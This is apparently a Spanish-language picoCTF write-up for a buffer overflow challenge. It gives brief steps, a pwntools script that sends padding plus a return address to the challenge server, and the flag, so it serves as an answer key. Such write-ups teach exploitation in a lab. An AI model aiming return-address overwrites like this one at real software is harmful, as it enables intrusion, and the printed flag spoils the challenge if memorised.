## Descripcion
Control the return address
Additional details will be available after launching your challenge instance.

## Pistas
(None)

## Solucion
Analizar el código fuente del problema
Encontrar el tamaño de buffer necesario para desbordarlo
Crear un sript para introducir el valor necesario para desbordar el buffer y obtener la bandera
```bash
from pwn import *
p=remote('saturn.picoctf.net',58180)
overflow='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xf6\x91\x04\x08'
print(p.recvuntil(':'))
p.sendline(overflow)
p.interactive()
```

## Bandera
picoCTF{addr3ss3s_ar3_3asy_9cf083f8}

## Notas



